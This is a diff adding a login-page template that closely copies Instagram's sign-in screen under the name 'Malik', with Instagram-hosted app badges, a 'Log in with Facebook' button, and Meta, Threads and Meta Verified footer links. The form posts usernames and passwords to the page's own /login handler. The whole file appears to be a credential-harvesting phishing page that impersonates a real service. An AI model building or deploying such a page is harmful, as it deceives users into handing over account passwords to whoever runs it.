@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Malik • Login</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+
+<body>
+    <div class="main-container">
+        <!-- Main Login Card -->
+        <div class="login-card">
+            <!-- Logo Section -->
+            <div class="logo-section">
+                <h1 class="logo-text">Malik</h1>
+            </div>
+
+            <!-- Error Message -->
+            {{if .Error}}
+            <div class="error-msg">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+                </svg>
+                {{.Error}}
+            </div>
+            {{end}}
+
+            <!-- Login Form -->
+            <form action="/login" method="POST" class="ig-form">
+                <div class="input-group">
+                    <div class="input-container">
+                        <input type="text" name="email" id="email" required
+                            placeholder="Phone number, username, or email">
+                        <label for="email">Phone number, username, or email</label>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-container">
+                        <input type="password" name="password" id="password" required placeholder="Password">
+                        <label for="password">Password</label>
+                    </div>
+                    <button type="button" class="show-btn" onclick="togglePassword()">Show</button>
+                </div>
+
+                <button type="submit" class="submit-btn">Log in</button>
+
+                <div class="separator">
+                    <div class="sep-line"></div>
+                    <div class="sep-text">OR</div>
+                    <div class="sep-line"></div>
+                </div>
+
+                <button type="button" class="fb-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
+                    </svg>
+                    Log in with Facebook
+                </button>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </form>
+        </div>
+
+        <!-- Sign Up Card -->
+        <div class="signup-card">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <!-- App Download -->
+        <div class="app-section">
+            <p>Get the app.</p>
+            <div class="store-btns">
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
+                        alt="Download on the App Store"></a>
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+                        alt="Get it on Google Play"></a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ig-footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Malik Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading &amp; Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div class="footer-bottom">
+                <select class="lang-select">
+                    <option>English</option>
+                    <option>हिन्दी</option>
+                </select>
+                <span>© 2026 Malik from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Toggle Password Visibility
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const btn = document.querySelector('.show-btn');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                pwd.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        // Floating Label Logic
+        document.querySelectorAll('.input-container input').forEach(input => {
+            input.addEventListener('input', function () {
+                if (this.value) {
+                    this.classList.add('has-value');
+                } else {
+                    this.classList.remove('has-value');
+                }
+            });
+            // Check on page load
+            if (input.value) {
+                input.classList.add('has-value');
+            }
+        });
+    </script>
+</body>
+
+</html>
